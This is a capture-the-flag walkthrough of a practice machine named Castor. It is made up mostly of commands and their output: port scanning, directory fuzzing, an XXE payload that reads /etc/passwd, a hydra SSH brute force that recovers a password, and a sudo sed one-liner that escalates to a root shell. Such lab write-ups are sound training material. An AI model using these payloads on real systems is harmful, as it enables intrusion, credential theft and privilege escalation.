# Castor [https://labs.thehackerslabs.com/machine/165]

# Nmap Scan Result

```
$ sudo nmap -sCV -p- 192.168.173.129

Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-15 12:46 GMT
Nmap scan report for 192.168.173.129
Host is up (0.00045s latency).
Not shown: 65533 closed tcp ports (reset)

PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: CastorTech | Madera Sostenible
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.70 seconds
```

# Dir Fuzzing

```
$ ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://192.168.173.129/FUZZ.php

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.173.129/FUZZ.php
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 362ms]
.htaccess               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 371ms]
cgi-bin/                [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 1ms]
upload                  [Status: 200, Size: 16, Words: 3, Lines: 1, Duration: 10ms]
:: Progress: [20481/20481] :: Job [1/1] :: 104 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

# XXE

Request - 

```
GET /upload.php/ HTTP/1.1
Host: 192.168.173.129
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/xml
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Length: 79

<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
```

Response - 

```
HTTP/1.1 200 OK
Date: Sun, 15 Mar 2026 13:05:20 GMT
Server: Apache/2.4.62 (Debian)
Content-Length: 1171
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: image/svg+xml

<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY test SYSTEM "file:///etc/passwd">
]>
<root>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
castorcin:x:1001:1001:castorcin,,,:/home/castorcin:/bin/bash
</root>
```

# SSH Bruteforcing

```
$ hydra -l castorcin -P /usr/share/wordlists/rockyou.txt ssh://192.168.173.129

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-15 13:07:00
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.173.129:22/

[22][ssh] host: 192.168.173.129   login: castorcin   password: chocolate

1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-15 13:07:09
```

# User Flag 

```
castorcin@TheHackersLabs-Castor:~$ ls
user.txt
castorcin@TheHackersLabs-Castor:~$ cat user.txt
THL{JDBNASJNAdnnasdkasdaCastorcito}
castorcin@TheHackersLabs-Castor:~$ 
```

# Priv Esca

```
castorcin@TheHackersLabs-Castor:~$ sudo -l
sudo: unable to resolve host TheHackersLabs-Castor: Fallo temporal en la resolución del nombre
Matching Defaults entries for castorcin on TheHackersLabs-Castor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User castorcin may run the following commands on TheHackersLabs-Castor:
    (ALL : ALL) NOPASSWD: /usr/bin/sed
```

# GTFOBins

```
It runs in privileged context and may be used to access the file system, escalate or maintain access with elevated privileges if enabled on sudo.

    GNU version only. Also, this requires bash.

    sudo sed -n '1e exec sh 1>&0' /etc/hosts

```

# Root Flag

```
$ sudo /usr/bin/sed -n '1e exec sh 1>&0' /etc/hosts
sudo: unable to resolve host TheHackersLabs-Castor: Fallo temporal en la resolución del nombre
# whoami
root
# cd /root
# ls
congrats.txt  root.txt
# cat root.txt
THL{asdmaskdmasdkCASTOR}
# cat congrats.txt

========================================================================================================================================================
Felicidades! Has logrado vulnerar la maquina con exito.
Recuerda que el objetivo de este CTF es el aprendizaje si algo no salio a la primera vuelve a intentarlo 
=========================================================================================================================================================
# 
```

